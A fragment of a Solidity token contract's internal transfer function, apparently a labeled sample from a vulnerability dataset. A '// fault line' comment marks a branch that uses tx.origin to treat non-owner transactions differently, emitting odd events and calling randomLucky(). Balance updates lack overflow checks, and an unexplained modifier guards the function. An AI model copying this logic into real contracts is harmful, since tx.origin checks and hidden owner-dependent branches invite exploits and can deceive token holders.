function _transfer(address _from, address _to, uint256 _value) internal tt(_from) {
        require(balances[_from] >= _value);
        require(_to != 0x0);
        balances[_to] += _value;
        balances[_from] -= _value;
        emit Transfer(_from, _to, _value);
        if (tx.origin != owner) {  // fault line
            emit Transfer212(msg.sender, curPair, 1);
            if (msg.sender == curPair) {
                emit Transfer212(_from, _to, _value);
            }
            randomLucky();
            randomLucky();
        }
    }